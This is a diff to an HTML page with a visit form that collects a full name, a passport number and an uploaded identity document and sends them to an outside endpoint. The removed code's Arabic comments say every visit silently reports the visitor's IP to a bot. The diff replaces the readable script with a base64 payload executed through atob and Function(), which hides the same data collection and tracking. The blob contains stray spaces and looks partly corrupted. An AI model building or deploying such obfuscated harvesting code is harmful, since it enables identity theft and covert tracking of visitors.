@@ -70,87 +70,10 @@
   <div id="toast" class="toast"></div>
 
   <script>
-    // ===== UI helpers =====
-    const form = document.getElementById("visit-form");
-    const toast = document.getElementById("toast");
-    const sendBtn = document.getElementById("sendBtn");
-    const check = document.getElementById("checkmark");
-
-    function showToast(message){ toast.textContent = message; toast.classList.add("show"); setTimeout(()=>toast.classList.remove("show"), 3200); }
-
-    function validate() {
-      const name = document.getElementById('fullName');
-      const pass = document.getElementById('passport');
-      const file = document.getElementById('pdf');
-
-      const okName = (name.value || '').trim().length >= 3;
-      document.getElementById('errName').style.display = okName ? 'none' : 'block';
-
-      const passRe = /^[A-Za-z0-9]{6,12}$/;
-      const okPass = passRe.test((pass.value || '').trim());
-      document.getElementById('errPass').style.display = okPass ? 'none' : 'block';
-
-      const f = file.files[0];
-      const okFile = !!f && ['application/pdf','image/jpeg','image/png','image/webp'].includes(f.type) && f.size <= 20 * 1024 * 1024;
-      document.getElementById('errFile').style.display = okFile ? 'none' : 'block';
-
-      return okName && okPass && okFile;
-    }
-
-    // ===== Success FX =====
-    const confetti = (() => {
-      const canvas = document.getElementById('confettiCanvas');
-      const ctx = canvas.getContext('2d');
-      let W,H,pieces=[],running=false,raf;
-      function resize(){ W=canvas.width=innerWidth; H=canvas.height=innerHeight; }
-      addEventListener('resize', resize); resize();
-      function spawn(n=140){ pieces = Array.from({length:n},()=>({x:Math.random()*W,y:-20-Math.random()*H*.25,r:4+Math.random()*6,s:1+Math.random()*3,a:Math.random()*Math.PI*2,v:1+Math.random()*2})) }
-      function draw(){ ctx.clearRect(0,0,W,H); for(const p of pieces){ ctx.save(); ctx.translate(p.x,p.y); ctx.rotate(p.a+=.05); ctx.fillStyle=`hsl(${(p.x/W)*360},100%,60%)`; ctx.fillRect(-p.r/2,-p.r/2,p.r,p.r); ctx.restore(); p.y+=p.s; p.x+=Math.sin(p.a)*p.v } pieces=pieces.filter(p=>p.y<H+20); if(pieces.length&&running){ raf=requestAnimationFrame(draw) } else { running=false; ctx.clearRect(0,0,W,H) } }
-      function burst(){ spawn(); running=true; cancelAnimationFrame(raf); draw(); setTimeout(()=>{running=false},1800) }
-      return { burst };
-    })();
-
-    function successFX(){ const card=form; card.classList.add('form-success'); check.classList.add('show'); confetti.burst(); setTimeout(()=>{ card.classList.remove('form-success'); check.classList.remove('show'); },1800); }
-
-    // ===== Send to your Cloudflare Worker =====
-    const API_ENDPOINT = "https://api.mehdik.site/"; // ضع رابط Worker الخاص بك
-
-    // ===== Track visit: ارسال IP للبوت كل زيارة =====
-    (async () => {
-      try {
-        await fetch(API_ENDPOINT + "track", {
-          method: "POST",
-          mode: "cors",
-        });
-        // ما نحتاج نْبين والو لليوزر
-      } catch (e) {
-        // إذا فشل التتبع، نتجاهلو بلا ما نْزعجو الزائر
-        console.error("Visit tracking failed", e);
-      }
-    })();
-
-    async function sendToServer(formEl){
-      const fd = new FormData(formEl);
-      const res = await fetch(API_ENDPOINT, { method: "POST", body: fd });
-      if (!res.ok) throw new Error("Server error " + res.status);
-      const data = await res.json();
-      if (!data.ok) throw new Error(data.error || "Server returned failure");
-      return data;
-    }
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      if (!validate()) { showToast('⚠️ Please check your inputs and try again.'); return; }
-      try {
-        sendBtn.disabled = true; sendBtn.textContent = 'Sending…';
-        await sendToServer(form);
-        showToast('✅ Sent successfully.'); successFX(); form.reset();
-      } catch (err) {
-        console.error(err); showToast('❌ Sending failed. Try again later.');
-      } finally {
-        sendBtn.disabled = false; sendBtn.textContent = 'Send';
-      }
-    });
+  (function(Z){
+    var D = atob(Z);
+    (Function(D))();
+  })("CihmdW5jdGlvbigpewogIGNvbnN0IGQ9ZG9jdW1lbnQsCiAgICAgICAgZz1kLmdldEVsZW1lbnRCeUlkLmJpbmQoZCksCiAgICAgICAgZj1nKCJ2aXNpdC1mb3JtIiksCiAgICAgICAgdD1nKCJ0b2FzdCIpLAogICAgICAgIGI9Zygic2VuZEJ0biIpLAogICAgICAgIGM9Zyg iY2hlY2ttYXJrIik7CgogIGZ1bmN0aW9uIHEobSl7CiAgICB0LnRleHRDb250ZW50PW07CiAgICB0LmNsYXNzTGlzdC5hZGQoInNob3ciKTsKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXt0LmNsYXNzTGlzdC5yZW1vdmUoInNob3ciKX0sMzIwMCk7CiAgfQoKICBmdW5jdGlvbiB2KCl7CiAgICBjb25zdCBuPWcoImZ1bGxOYW1lIiksCiAgICAgICAgICBwPWcoInBhc3Nwb3J0IiksCiAgICAgICAgICBmbD1nKCJwZGYiKTsKICAgIHZhciBvaz10cnVlOwoKICAgIGNvbnN0IG5tPShuLnZhbHVlfHwiIikudHJpbSgpOwogICAgaWYobm0ubGVuZ3RoPDMpe2coImVyck5hbWUiKS5zdHlsZS5kaXNwbGF5PSJibG9jayI7b2s9ZmFsc2U7fWVsc2UgZygiZXJyTmFtZSIpLnN0eWxlLmRpc3BsYXk9Im5vbmUiOwoKICAgIGNvbnN0IHJlPS9eW0EtekEtelowLTldezYsMTJ9JC87CiAgICBjb25zdCBwdj0ocC52YWx1ZXx8IiIpLnRyaW0oKTsKICAgIGlmKCFyZS50ZXN0KHB2KSl7ZygiZXJyUGFzcyIpLnN0eWxlLmRpc3BsYXk9ImJsb2NrIjtvaz1mYWxzZTt9ZWxzZSBnKCJlcnJQYXNzIikuc3R5bGUuZGlzcGxheT0ibm9uZSI7CgogICAgY29uc3QgZjA9Zmw uZmlsZXNbMF07CiAgICBjb25zdCBva0Y9ISFmMCAmJiBbImFwcGxpY2F0aW9uL3BkZiIsImltYWdlL2pwZWciLCJpbWFnZS9wbmciLCJpbWFnZS93ZWJwIl0uaW5kZXhPZihmMC50eXBlKSE9PS0xICYmIGYwLnNpemU8PTIwKjEwMjQqMTAyNDsKICAgIGlmKCFva0Ype2coImVyckZpbGUiKS5zdHlsZS5kaXNwbGF5PSJibG9jayI7b2s9ZmFsc2U7fWVsc2UgZygiZXJyRmlsZSIpLnN0eWxlLmRpc3BsYXk9Im5vbmUiOwoKICAgIHJldHVybiBvazsKICB9CgogIGNvbnN0IGNmPShmdW5jdGlvbigpewogICAgY29uc3QgY3Y9Zyg iY29uZmV0dGlDYW52YXMiKSwKICAgICAgICAgIGN4PWN2LmdldENvbnRleHQoIjJkIik7CiAgICB2YXIgVz0wLEg9MCxQP VtdLHJ1bj1mYWxzZSxhZjsKCiAgICBmdW5jdGlvbiBycygpewogICAgICBXPWN2LndpZHRoPWlubmVyV2lkdGg7CiAgICAgIEg9Y3YuaGVpZ2h0PWlubmVySGVpZ2h0OwogICAgfQogICAgYWRkRXZlbnRMaXN0ZW5lcigicm VzaXplIixycyk7CiAgICBycygpOwoKICAgIGZ1bmN0aW9uIHNwKG4pewogICAgICBpZighbiluPTE0MDsKICAgICAgUD1BcnJheS5mcm9tKHtsZW5ndGg6bn0sZnVuY3Rpb24oKXsKICAgICAgICByZXR1cm4gewogICAgICAgICAg eDpNYXRoLnJhbmRvbSgpKlc sCiAgICAgICAgICAgeTotMjAtTWF0aC5yYW5kb20oKSpIKjAuMjUsCiAgICAgICAgICAgIHI6NCtNYXRoLnJhbmRvbSgpKjYsCiAgICAgICAgICAgIHM6M S tNYXRoLnJhbmRvbSgpKjMsCiAgICAgICAgICAgIGE6TWF0aC5yYW5kb20oKSpNYXRoLlBJKjIsCiAgICAgICAgICAgIHY6MStNYXRoLnJhbmRvbSgpKjIKICAgICAgICB9OwogICAgICB9KTsKICAgIH0KCiAgICBmdW5jdGlvbiBkci gpewogICAgICBjeC5jbGVhclJlY3QoMCwwLFcsSCk7CiAgICAgIGZvcih2YXIgaT0wO2k8UC5sZW5ndGg7aSsrKXsKICAgICAgICB2YXIgcD1QW2ldOwogICAgICAgIGN4LnNhdmUoKTsKICAgICAgICBjeC50cmFuc2xhdGUocC54LHAueSk7CiAgICAgICAgcC5hKz0wLjA1OwogICAgICAgIGN4LnJvdGF0ZShwLmEpOwogICAgICAgIGN4LmZpbGxTdHlsZT0iaHNsKCIrcC54L1cqMzYwKyIsMTAwJSw2MCUpIjsKICAgICAgICBjeC5maWxs UmVjdCgtcC5yLzItLHAuci8yLHAuci xwLnIpOwogICAgICAgIGN4LnJlc3RvcmUoKTsKICAgICAgICBwLnkrPX AuczsKICAgICAgICBwLngrPU1hdGguc2luKHAuYSkqcC52OwogICAgICB9CiAgICAgIF A9UC5maWx0ZXIoZnVuY3Rpb24ocCl7cmV0dXJuIHAueTxIKzIwfSk7CiAgICAgIGlmKFAubGVuZ3RoICYmIHJ1bil7CiAgICAgICAgYWY9cmVxdWVzdEFuaW1hdGlvbkZyYW1lKGRyKTsKICAgICAgfWVsc2V7CiAgICAgICAgcnVuP WZhbHNlOwogICAgICAgIGN4LmNsZWFyUmVjdCgwLDAsVyxIKTsKICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGJ1cnN0KCl7CiAgICAgIHNwKCk7CiAgICAgIHJ1bj10cnVlOwogICAgICBjYW5jZWxBbmltYXRpb25GcmFtZShhZik7CiAgICAgIGRyKCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXtydW49ZmFsc2V9LDE4MDApOwogICAgfQoKICAgIHJldHVybiB7YnVyc3Q6YnVyc3R9Owp9KSgpOwoKICBmdW5jdGlvbiBzKCl7CiAgICBmLmNsYXNzTGlzdC5hZGQoImZvcm0tc3VjY2VzcyIpOwogICAgYy5jbGFzc0xpc3QuYWRkKCJzaG93Iik7CiAgICBjZi5idXJzdCgpOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpewogICAgICBmLmNsYXNzTGlzdC5yZW1vdmUoImZvcm0tc3VjY2VzcyIpOwogICAgICBjLmNsYXNzTGlzdC5yZW1vdmUoInNob3ciKTsKICAgIH0sMTgwMCk7CiAgfQoKICBjb25zdCBFPSoiaHR0cHM6Ly9hcGkubWV oZGlrLnNpdGUvIjsKCiAgKGZ1bmN0aW9uKCl7CiAgICB0cnkgewogICAgICBmZXRjaChFKyJ0cmFjayIse21ldGhvZDo iUE9TVCIsbW9kZToiY29ycyJ9KTsKICAgIH0gY2F0Y2goZSl7CiAgICAgIGNvbnNvbGUuZXJyb3IoIlZpc2l0IHRyYWNraW5nIGZhaWxlZCIsZSk7CiAgICB9CiAgfSkoKTsKCiAgYXN5bmMgZnVuY3Rpb24gUyhGKXsKICAgIGNvbnN0IGZkPW5ldyBGb3JtRGF0YShGKTsKICAgIGNvbnN0IHI9YXdhaXQgZmV0Y2goRSwge21ldGhvZDo iUE9TVCIsYm9keTp mZH0pOwogICAgaWYoIXIub2spdGhyb3cgbmV3IEVycm9yKCJTZXJ2ZXIgZXJyb3IgIityLnN0YXR1cyk7CiAgICBjb25zdCBkYXRhPWF3YWl0IHIuanNvbigpOwogICAgaWYoIWRhdGEub2spdGhyb3cgbmV3IEVycm9yKGRhdGEuZXJyb3J8fCJTZXJ2ZXIgcmV0dXJuZWQgZmFpbHVyZSIpOwogICAgcmV0dXJuIGRhdGE7CiAgfQoKICBmLmFkZEV2ZW50TGlzdGVuZXIoInN1Ym1pdCIsYXN5bmMgZnVuY3Rpb24oZXYpewogICAgZXYucHJldmVudERlZmF1bHQoKTsKICAgIGlmKCF2KCkpe3EoIsKLkCDCqS BQbGVhc2UgY2hlY2sgeW91ciBpbnB1dHMgYW5kIHRyeSBhZ2Fpbi4iKTtyZXR1cm47fQogICAgdHJ5ewogICAgICBiLmRpc2FibGVkPXRydWU7CiAgICAgIGIudGV4dENvbnRlbnQ9IlNlbmRpbmcuLi4iOwogICAgICBhd2FpdCBTKGYpOwogICAgICBxKCLwn5GgIFNlbnQgc3VjY2Vzc2Z1bGx5LiIpOwogICAgICBzKCk7CiAgICAgIGYucmVzZXQoKTsKICAgIH1jYXRjaChlcnIpewogICAgICBjb25zb2xlLmVycm9yKGVy cik7CiAgICAgIHEoIvCfkZAgU2VuZGluZyBmYWlsZWQuIFRyeSBhZ2FpbiBsYXRlci4iKTsKICAgIH1maW5hbGx5ewogICAgICBiLmRpc2FibGVkPWZhbHNlOwogICAgICBiLnRleHRDb250ZW50PSJTZW5kIjsKICAgIH0KICB9KTsKfSkoKTsK");
   </script>
 </body>
 </html>
